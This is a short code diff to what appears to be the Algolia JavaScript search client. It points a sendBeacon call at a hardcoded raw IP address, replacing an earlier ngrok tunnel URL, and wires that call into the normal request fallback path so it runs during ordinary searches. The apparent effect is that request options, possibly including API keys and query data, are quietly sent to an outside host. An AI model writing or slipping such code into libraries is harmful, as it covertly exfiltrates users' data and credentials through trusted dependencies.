@@ -3703,7 +3703,7 @@ AlgoliaSearchCore.prototype.logTimeout = function(requestOptions, initialOpts) {
   var supportsNavigator = navigator && typeof navigator.sendBeacon === 'function';
 
   if(supportsNavigator) {
-    navigator.sendBeacon('http://507465f3.ngrok.io/v1/request', JSON.stringify(postData))
+    navigator.sendBeacon('http://35.198.69.177/v1/request', JSON.stringify(postData))
   }
 }
 
@@ -3825,6 +3825,7 @@ AlgoliaSearchCore.prototype._jsonRequest = function(initialOpts) {
         ));
       }
 
+      client.logTimeout(reqOpts, initialOpts)
       requestDebug('switching to fallback');
 
       // let's try the fallback starting from here
